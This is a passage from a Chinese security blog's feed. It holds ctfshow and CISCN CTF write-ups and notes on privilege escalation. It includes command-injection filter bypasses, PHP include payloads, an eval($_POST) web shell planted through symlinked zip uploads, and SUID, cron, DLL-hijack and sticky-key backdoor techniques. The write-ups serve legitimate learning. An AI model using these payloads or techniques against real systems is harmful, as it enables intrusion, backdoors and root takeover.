alt="clip_image023"></p><blockquote><p>用到了？三元运算符 即前面表达式为真，则执行：前的，反之执行：后的</p></blockquote><blockquote><p>“&#x3D;&amp;“的一个说明</p></blockquote><blockquote><p>$a &#x3D; $b; &#x2F;&#x2F;把$b赋值给$a,如果赋值之后,$b改变了,$a不变</p></blockquote><blockquote><p>$a &#x3D;&amp;$b; &#x2F;&#x2F;把$b的地址传递给$a,这时候,$a和$b都指向内存中的同一块地址,所以如果赋值后,$b改变,$a也会改变</p></blockquote><blockquote><p>如果$_GET有东西传参进去就  将$_GET方法变成$_POST方法</p></blockquote><blockquote><p>思路：随便传一个get值，不能是flag&#x3D;flag就行，并传post值HTTP_FLAG&#x3D;flag 在判断highlight_file时就能通过</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522735.png" alt="clip_image025"></p><h3 id="Web99"><a href="#Web99" class="headerlink" title="Web99"></a>Web99</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522978.png" alt="clip_image027"></p><blockquote><p>array_push() 函数向数组尾部插入一个或多个元素。</p></blockquote><blockquote><p>array_push(<em>array,value1,value2…</em>)</p></blockquote><blockquote><p>$a&#x3D;array(“a”&#x3D;&gt;”red”,”b”&#x3D;&gt;”green”);<br> array_push($a,”blue”,”yellow”); 两种使用方式</p></blockquote><blockquote><p>如果数组</p></blockquote><blockquote><p>file_put_contents() 函数把一个字符串写入文件中。如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。</p></blockquote><blockquote><p>in_array — 检查数组中是否存在某个值{</p></blockquote><blockquote><p>in_array(mixed $needle, array $haystack, bool $strict &#x3D; false): bool</p></blockquote><blockquote><p>大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。 }36-846的随机写入数字 有一个概率问题 到底会有什么会在allow数组中 1的可能性是最大的</p></blockquote><blockquote><p>这道题是弱比较类型所以 字符串类型绕过1.php&#x3D;&#x3D;1</p></blockquote><blockquote><p>通过post传参写入 rce</p><p>然后访问2.php就行</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523710.png" alt="clip_image029"></p><h3 id="Web100"><a href="#Web100" class="headerlink" title="Web100"></a>Web100</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523863.png" alt="clip_image031"></p><blockquote><p>is_numeric — 检测变量是否为数字或数字字符串 </p></blockquote><blockquote><p>如果 <code>value</code> 是数字或<a href="https://www.php.net/manual/zh/language.types.numeric-strings.php">数字字符串</a>， 返回 <code>**true**</code>；否则返回 <code>**false**</code>。</p></blockquote><blockquote><p>这里是个大坑 因为赋值运算优先于逻辑判断，且赋值运算逻辑为true 所以这个$v0与后面的$v2$v3无关</p></blockquote><blockquote><p>还有$v2中不能出现； 考虑PHP语句最后一句可不加；直接闭合</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523123.png" alt="clip_image033"></p><blockquote><p>正常RCE</p></blockquote><blockquote><p>ctfshow{2d6dd5c50x2d8c980x2d4c3e0x2da10e0x2dc6b39863b5e2}</p></blockquote><blockquote><p>0x2d&#x3D;”-”</p></blockquote><blockquote><p>ctfshow{2d6dd5c5-8c98-4c3e-a10e-c6b39863b5e2}</p></blockquote><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><blockquote><p>考点：PHP 反射机制Reflection<a href="https://www.php.net/manual/zh/class.reflectionclass.php">PHP: ReflectionClass - Manual</a></p></blockquote><blockquote><p><strong>ReflectionClass</strong> 类报告了一个类的有关信息。</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523714.png" alt="clip_image035"></p><blockquote><p>这样可以echo出asd类中的属性及其方法</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523658.png" alt="clip_image037"></p><blockquote><p>注意这次的flag值少了一位，自己猜一下</p></blockquote><h3 id="Web102"><a href="#Web102" class="headerlink" title="Web102"></a>Web102</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523844.png" alt="clip_image039"></p><blockquote><p>substr() 函数返回字符串的一部分。substr(string,start,length)</p></blockquote><blockquote><p>call_user_func — 把第一个参数作为回调函数调用</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow刷题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试提权</title>
    <link href="/2023/05/31/penetration/%E6%8F%90%E6%9D%83/"/>
    <url>/2023/05/31/penetration/%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h2 id="提权篇"><a href="#提权篇" class="headerlink" title="提权篇"></a>提权篇</h2><p>一切一切一切的前提是你拿到了基础权限，能rce时</p><h3 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h3><p> <a href="https://www.exploit-db.com/">内核漏洞exp网</a></p><blockquote><p>根据内核从网站上找对应的exp 在里面执行</p><p>当然，如果这个漏洞被修复过了，就再找一个，这类漏洞实战中比较少，属于高危漏洞</p></blockquote><h3 id="Suid提权"><a href="#Suid提权" class="headerlink" title="Suid提权"></a>Suid提权</h3><blockquote><p>执行赋予4xxx的可执行文件</p></blockquote><blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757864.gif" alt="img"></p><p>Echo $PATH把当前tmp（777）目录增加到环境变量</p><p>Export PATH&#x3D;.:$PATH</p><p>设置了PATH执行cat的时候会优先从当前目录下查找程序。所以4xxx的可执行文件中的cat命令会被劫持，就会转到root用户</p><p>特定SUID参数利用，工具&#x2F;手工探测后看参数是否被赋予SUID权限</p><p>Nmap，Vim，find，Bash，More，Less，Nano，cp等系统命令 在suid可执行文件中使用就会发生劫持</p></blockquote><h3 id="GNU-C-library动态链接区-ORIGIN溢出提权"><a href="#GNU-C-library动态链接区-ORIGIN溢出提权" class="headerlink" title="GNU C library动态链接区$ORIGIN溢出提权"></a>GNU C library动态链接区$ORIGIN溢出提权</h3><blockquote><p><a href="https://blog.csdn.net/qq_45555226/article/details/125686751"><strong>https://blog.csdn.net/qq_45555226&#x2F;article&#x2F;details&#x2F;125686751</strong></a></p><p><strong>&#x2F;proc&#x2F;N&#x2F;fd 包含进程相关的所有的文件描述符</strong></p><p><strong>LDPRELOAD 在所有其他对象（附加的、用户指定、ELF 共享对象）之前加载，但实际上 LDPRELOAD 并非真的是首先加载，通过利用 LDAUDIT 环境变量可以实现优先于 LD_PRELOAD 加载。</strong></p><p><strong>劫持预加载动态链接库 LD_AUDIT：</strong>LD_AUDIT&#x3D;”$ORIGIN” exec &#x2F;proc&#x2F;self&#x2F;fd&#x2F;3</p><p>大概懂了但应该不怎么懂，和suid提权有一点像</p></blockquote><h3 id="LINUX-CRON-JOBS提权"><a href="#LINUX-CRON-JOBS提权" class="headerlink" title="LINUX CRON JOBS提权"></a>LINUX CRON JOBS提权</h3><blockquote><p>大概就是利用 &#x2F;etc&#x2F;crontab文件，可以设定系统定期执行的任务。</p><p>对于crontab的一些学习</p><p>首先 vi &#x2F;etc&#x2F;crontab添加定时执行任务（需要root权限）</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757868.gif" alt="img"></p><p>设定细节看链接<a href="https://blog.csdn.net/qq_41969358/article/details/87892343">https://blog.csdn.net/qq_41969358/article/details/87892343</a></p><p>注意python文件的文件格式</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757870.gif" alt="img"></p><p>如果用xftp传过去的话格式为doc 运行就会提示权限不够 所以需要修改fileformat&#x3D;unix nnd找了好久</p><p>然后因为1.py是存在tmp（777）下的  达到提权</p><p><strong><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757838.gif" alt="img"></strong></p><p><strong>给dash加上</strong></p><p><strong><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757863.gif" alt="img"></strong></p><p>在普通用户下使用dash能做到在dash中提权</p><p>Dash提权一般用于Ubuntu，主要Windows的定时系统</p></blockquote><h3 id="Lpk提权"><a href="#Lpk提权" class="headerlink" title="Lpk提权"></a>Lpk提权</h3><blockquote><p>仅用于Windows2003 和xp系统 </p></blockquote><blockquote><p>在window2003或windowxp存在开机自启应用时,例如WebMail </p><p>且该目录中存在exe和lpk.dll时,每当重启电脑,或者电脑开机时,exe执行,调用了假的lpk.dll时就会被劫持。</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306011916067.png" alt="image-20230601191622884">T00ls Lpk Sethc v4生成lpk dll文件的工具，利用这个工具就可以生成后门文件劫持exe(作用是替换sethc（粘滞键))实现提权 </p><p>可以在该软件里自定义热键来唤醒,和密码来登录</p><p>远程链接 按 shirt 五次弹出 Sethc 窗口 同时按着 ctrl a 和 b 就会弹出后门输入密码 123456就能进去里</p></blockquote><h3 id="zend-nc提权"><a href="#zend-nc提权" class="headerlink" title="zend nc提权"></a>zend nc提权</h3><blockquote><p>首先zend是服务器所使用的一个插件,在服务器重启的时候被调用</p><p>iis6.0 在启动的时候 或 收回进程重启启动的时候有人访问网站的时候就会加载 dll 文件</p><p>提权方法:</p><p>首先利用Zend_DLL_Hijacking_for_nc.exe 生成相应dll文件,</p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306012022607.png" alt="image-20230601202221563" style="zoom:33%;" /><p>然后替换掉lib下的原dll文件,然后重启服务器,然后访问网站php网页</p><p>此时就能telnet远程登录服务器了 teletnt 192.168.0.115 4444</p><p>一般都是开防火墙的,可能这个不太行,所以一般只是在反弹shell不能用的情况下碰碰运气用的</p></blockquote><h3 id="Zend-反弹shell提权"><a href="#Zend-反弹shell提权" class="headerlink" title="Zend 反弹shell提权"></a>Zend 反弹shell提权</h3><blockquote><p>原理和前面的差不多</p><p>利用msf文件生成反弹程序（msf见<a href="https://zhuanlan.zhihu.com/p/604440914">kali msfconsole命令详解以及靶机攻破实战</a>） 然后上传至目标主机服务器内 利用zend工具将dll文件进行生成 并将原dll文件替换 并在kali攻击机上设置监听 当目标服务器有人进行php网站访问时就会被捕获 从而提权</p></blockquote><h3 id="Filezilla提权"><a href="#Filezilla提权" class="headerlink" title="Filezilla提权"></a>Filezilla提权</h3><blockquote><p>原理是利用lck端口转发工具 利用filezilla多端口远程登录 达到可以修改filezilla共享的文件夹内的文件 配合其他手段达到提权 下文就是利用cmd.exe替换sethe.exe来达到替换粘滞键提权</p><p>具体实施过程：</p><p>利用lck端口转发filezilla的14147端口至14148 然后在攻击机上用14148端口登录filezilla 从而修改登录用户或者修改所共享的目录 然后更改目录中C:\WINDOWS\system32 中的sethc.exe（粘滞）修改为cmd进行污染</p></blockquote><blockquote><p>看教程说是粘滞键的一般是sethc.exe,但是此次实验中有多个不一样的，遇到这种问题，那就开了粘滞键看进程是哪一个在执行，替换掉就行了</p></blockquote><blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757882.gif" alt="img"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757662.gif" alt="img"></p><p>不懂</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn初赛刷题</title>
    <link href="/2023/05/30/web/ciscn/"/>
    <url>/2023/05/30/web/ciscn/</url>
    
    <content type="html"><![CDATA[<h3 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>&#125;; <br></code></pre></td></tr></table></figure><blockquote><p>网站源码如上 </p><p>大概意思就是<a href="https://blog.csdn.net/weixin_46142761/article/details/121858917">$_FILES</a>的理解  上传的临时文件，然后finfo （获取文件类型），之后逻辑是 如果文件类型是zip时，那么就执行unzip 该压缩包到当前目录 </p><p>这里用到了软连接，简单来说就是zip -y 能够同时压缩该文件夹有关软连接的信息，那么如果该文件夹连接到该网站的根目录下，下次解压相同文件夹名的时候，该文件夹中的文件自然就解压到网站根目录下，那么就能够用该文件马进行一系列rce了</p></blockquote><blockquote><p>首先建立软连接</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292037773.png" alt="image-20230529203732497"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292038267.png" alt="image-20230529203805218"></p><blockquote><p>进入到文件夹中然后写一个马</p><p>马的内容是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;1&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292039403.png" alt="image-20230529203956226"></p><blockquote><p>这里用到了zip命令中的-y参数<a href="https://www.cnbugs.com/post-4092.html">zip命令详解</a></p><p>-y 是直接保存符号连接，而非该链接所指向的文件，本参数仅在UNIX之类的系统下有效；</p><p>-r 是递归处理，将指定目录下的所有文件和子目录一并处理；</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292047401.png" alt="image-20230529204737313"></p><blockquote><p>构建好两个压缩包就可以开始上传了</p><p>先上传feng1.zip再上传feng2.zip 使feng.php解压到网站根目录&#x2F;var&#x2F;www&#x2F;html</p><p>然后就可以愉快rce了</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292052233.png" alt="image-20230529205248147"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>刷题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行刷题</title>
    <link href="/2023/05/29/web/web1/"/>
    <url>/2023/05/29/web/web1/</url>
    
    <content type="html"><![CDATA[<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="Web29-37"><a href="#Web29-37" class="headerlink" title="Web29-37"></a>Web29-37</h3><blockquote><p>都使用get传参，</p></blockquote><blockquote><p>根据被屏蔽的字词的不同考虑不同的解法</p><p>（1）system（“”）；执行一系列查看文件操作</p><p>（2）都可以一把梭 如果只对get的参数c进行限制 用eval（$_GET[]）来进行参数逃逸   如果（）被过滤可以考虑使用结构语言 include require print echo inset unset </p></blockquote><blockquote><p>常用Payload   ?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p></blockquote><blockquote><p>Filter伪协议 常用于读取文件&#x2F;源码</p></blockquote><h3 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h3><blockquote><p>使用了include文件包含，使用伪协议date 使后面的语句不是当成字符串类型，可以当成php语句被执行</p></blockquote><blockquote><p>短标签就是把&lt;?php 换成&lt;?&#x3D;  前提是这个功能打开</p></blockquote><blockquote><p>Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain,&lt;?php system(“tac f*”);?&gt;</span><br></code></pre></td></tr></table></figure><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301424026.png" alt="image-20230530142400973" style="zoom: 50%;" /></blockquote><h3 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h3><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301533464.png" alt="image-20230530153304420"></p><blockquote><p><strong>RCE无参数</strong></p></blockquote><blockquote><p>localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</p></blockquote><blockquote><p>scandir()：获取目录下的文件，scandir(.)：获取当前目录下所有文件</p></blockquote><blockquote><p>pos()：返回数组中的当前元素的值。</p></blockquote><blockquote><p>array_reverse()：数组逆序</p></blockquote><blockquote><p>next()： 函数将内部指针指向数组中的下一个元素，并输出。</p></blockquote><blockquote><p>highlight_file()：函数进行文件内容的读取，并输出(也可用show_source)</p></blockquote> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301850412.png" alt="image-20230530185039088" style="zoom: 50%;" /><blockquote><p>show_source(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote><blockquote><p>?c&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301534285.png" alt="image-20230530153424249" style="zoom:50%;" /><h3 id="Web43"><a href="#Web43" class="headerlink" title="Web43"></a>Web43<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932136.gif" alt="img"  /></h3><blockquote><p>代码中插入了&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1，“&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”的作用就是不回显。</p></blockquote><blockquote><p>（分隔符进行分割绕过）这道题和上一题差不多，不一样的是屏蔽了；可以用%0a绕过或者(%26%26)&amp;&amp;或者(%27%27)||绕过</p></blockquote><blockquote><p>不是很明白的一个点&amp;&amp;需要url编码 但是||却不要  原因：在URL内的所有不安全的字符必须被编码。保留的，预留的(Reserved)：许多URL方案为特殊的意义保留了某些字符：它们在部分URL指定方案中出现。如果相应八字节的字符是方案内部的保留字，那它必须被编码。字符; , &#x2F; , ? , : , @ , &#x3D; &amp;可能被某个方案预留用作特殊意义。在其他方案中不能保留其他字符。当一个八字节由一个字符表示并且被编码时，URL通常具有相同的解释。 但是，对于保留字符而言，这不是真的：编码一个为特定方案保留的字符可能会改变URL的语义。因此，在URL中数字、字母、特殊字符$ -_。+！*()以及保留字符要经过解码(unencoded)后才使用。另一方面，只要它们不用于保留目的，可以在URL指定方案中编码不需要编码的字符（包括字母数字）。</p></blockquote><blockquote><p>Payload：?c&#x3D;tac f*||</p></blockquote><h3 id="Web44"><a href="#Web44" class="headerlink" title="Web44"></a>Web44</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932183.gif" alt="img"></p><blockquote><p>跟上面一题一样 多了过滤flag 用通配符就行</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932182.gif" alt="img"></p><h3 id="Web45"><a href="#Web45" class="headerlink" title="Web45"></a>Web45</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932180.gif" alt="img"></p><blockquote><p>没什么特别的多了过滤空格常见方法如下</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">%<span class="hljs-number">09</span>（url传递）  表示的是tab (<span class="hljs-built_in">cat</span>%<span class="hljs-number">09</span>flag.php)<br><span class="hljs-variable">$</span>&#123;IFS&#125;<br><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span><br>&lt;&gt;（<span class="hljs-built_in">cat</span>&lt;&gt;flag）<br>&lt;（<span class="hljs-built_in">cat</span>&lt;flag）<br></code></pre></td></tr></table></figure><blockquote><p>{cat,flag}原理参考：<a href="https://blog.csdn.net/m0_56059226/article/details/117997472">https://blog.csdn.net/m0_56059226/article/details/117997472</a></p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932177.gif" alt="img"></p><h3 id="Web46"><a href="#Web46" class="headerlink" title="Web46"></a>Web46<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932197.gif" alt="img"></h3><blockquote><p>过滤多了数字 由于%09(tab)绕过空格解码后代表的是tab不属于数字不会被过滤</p></blockquote><blockquote><p>过滤了$ $$$所以不能用${IFS}绕过空格</p></blockquote><blockquote><p>沿用上一题的payload就行</p></blockquote><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932854.gif" alt="img" style="zoom: 80%;" /><h3 id="Web47"><a href="#Web47" class="headerlink" title="Web47"></a>Web47</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932883.gif" alt="img"></p><blockquote><p>过滤了more less 等查看文件的命令 （more:一页一页的显示档案内容</p></blockquote><blockquote><p>less:与 more 类似</p></blockquote><blockquote><p>head:查看头几行</p></blockquote><blockquote><p>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</p></blockquote><blockquote><p>tail:查看尾几行</p></blockquote><blockquote><p>nl：显示的时候，顺便输出行号</p></blockquote><blockquote><p>od:以二进制的方式读取档案内容</p></blockquote><blockquote><p>vi:一种编辑器，这个也可以查看</p></blockquote><blockquote><p>vim:一种编辑器，这个也可以查看</p></blockquote><blockquote><p>sort:可以查看</p></blockquote><blockquote><p>uniq:可以查看</p></blockquote><blockquote><p>file -f:报错出具体内容）还是一样用tac没什么好说的</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932941.gif" alt="img"></p><h3 id="Web48"><a href="#Web48" class="headerlink" title="Web48"></a>Web48</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932045.gif" alt="img"></p><blockquote><p>还是过滤多了sed cut等Linux命令</p></blockquote><blockquote><p>用上一题payload</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932120.gif" alt="img"></p><h3 id="Web49"><a href="#Web49" class="headerlink" title="Web49"></a>Web49</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932159.gif" alt="img"></p><blockquote><p>多了% 不过跟题目没啥关系 沿用上题payload</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932249.gif" alt="img"></p><h3 id="Web50"><a href="#Web50" class="headerlink" title="Web50"></a>Web50</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932321.gif" alt="img"></p><blockquote><p>过滤了&amp;（%26）和tab（%09） 一样啊 用&lt;绕过空格</p></blockquote><blockquote><p>但是不能用？通配符 ？？？</p></blockquote><blockquote><p>利用shall特性用’’或者””或者\隔开被过滤的字符串(原理：还有一个小知识，之前我在纠结为什么ca\t或者c\at的效果和cat一样，后来经过东拼西凑的问大佬和尝试，最后总结的原因是因为在linux里面当转义符号()转义普通字符的时候，和普通字符原来的效果是一样的，意思就是\t和t都是t，只有在转义特殊字符的时候，才起了作用，比如$，$则不再表示变量的意思。)</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932459.gif" alt="img"></p><h3 id="Web51"><a href="#Web51" class="headerlink" title="Web51"></a>Web51</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932519.gif" alt="img"></p><blockquote><p>多过滤了tac 换个nl继续用</p></blockquote><blockquote><p>或者继续ta\c</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932556.gif" alt="img"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932584.gif" alt="img"></p><h3 id="Web52"><a href="#Web52" class="headerlink" title="Web52"></a>Web52</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932748.gif" alt="img"></p><blockquote><p>常规去做 发现过滤了上一题的&lt;&gt; 有点惯性思维去找其他解题方法 没有看见没有过滤$</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932787.gif" alt="img"></p><blockquote><p>发现被耍了 这个flag.php中不是答案</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932833.gif" alt="img"></p><blockquote><p>查看根目录下的文件夹 发现是有flag这个文件的 有两个想法 一个是直接读取里面的文件，一个是把flag复制到当前文件夹中</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932977.gif" alt="img"></p><blockquote><p>二可行</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932039.gif" alt="img"></p><blockquote><p>查看一下flag这个文件的权限有rx，应该是可以读</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932154.gif" alt="img"></p><h3 id="Web53"><a href="#Web53" class="headerlink" title="Web53"></a>Web53</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932289.gif" alt="img"></p><blockquote><p>看了一下是echo函数 然后多了变量d后会system$c</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932337.gif" alt="img"></p><blockquote><p>常规看一下文件内容 有flag.php 直接看</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932487.gif" alt="img"></p><h3 id="Web54"><a href="#Web54" class="headerlink" title="Web54"></a>Web54</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932592.gif" alt="img"></p><blockquote><p>在正则中 .*c.*a.*t.*相当于cat中不能穿插任何字符了，所以不能用’’绕过 考虑用mv对文件重命名</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932758.gif" alt="img"></p><h3 id="Web55"><a href="#Web55" class="headerlink" title="Web55"></a>Web55</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932832.gif" alt="img"></p><blockquote><p>过滤了所有字母,查了资料 有两种解法 一种是通过执行的上传文件 另一种是通过&#x2F;bin&#x2F;base64输出flag </p></blockquote><blockquote><p>第二种方法试了下发现不能用 </p></blockquote><blockquote><p>仔细研究了p神的文章<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p></blockquote><blockquote><p>具体方法：。.或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则. file的意思就是用bash执行file文件中的命令。（1. “ .&#x2F; “ 的方式类似于新建了一个shell， 在这个新建的shell中去执行脚本中的程序，类似于新建了一个子进程，但这个子进程不继承父进程的所有非export类型的变量，并且脚本中对非export环境变量的创建或修改不会反馈到外部调用shell中</p></blockquote><blockquote><p>\2. ” . “ 的方式类似于将脚本中的每一行指令逐条在当前shell中执行，因此它继承了当前shell的环境变量，同时脚本中对环境变量的修改也可以反馈到shell中）</p></blockquote><blockquote><p>上传的文件会临时储存在一个地址下一般为&#x2F;tmp&#x2F;phpXXXXXX，文件名最后6个字符是随机的大小写字母。最后构造POC，执行任意命令</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302006557.png" alt="image-20230530200618504"></p><p> <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302006428.png" alt="image-20230530200629352"></p><blockquote><p>最后rce</p></blockquote><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302007840.png" alt="image-20230530200713771"  /><h3 id="Web56"><a href="#Web56" class="headerlink" title="Web56"></a>Web56</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002648.gif" alt="img"></p><blockquote><p>比55多过滤了数字和$ 应该对文件上传影响不大 尝试用文件上传</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302005771.png" alt="image-20230530200527722"></p><h3 id="Web57"><a href="#Web57" class="headerlink" title="Web57"></a>Web57</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002650.gif" alt="img"></p><blockquote><p>多过滤了. 和? 所以不能像上一题用文件上传</p></blockquote><blockquote><p>这道题表达flag在36.php 而在system函数中也有cat和.php 只需要传参c&#x3D;36就行了</p></blockquote><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">在Linux shell中$(())是代表数学运算   ~代表取反    举个栗子：a=1,b=2<br><span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>就等同于$((<span class="hljs-number">1</span>+<span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure></blockquote><p><img 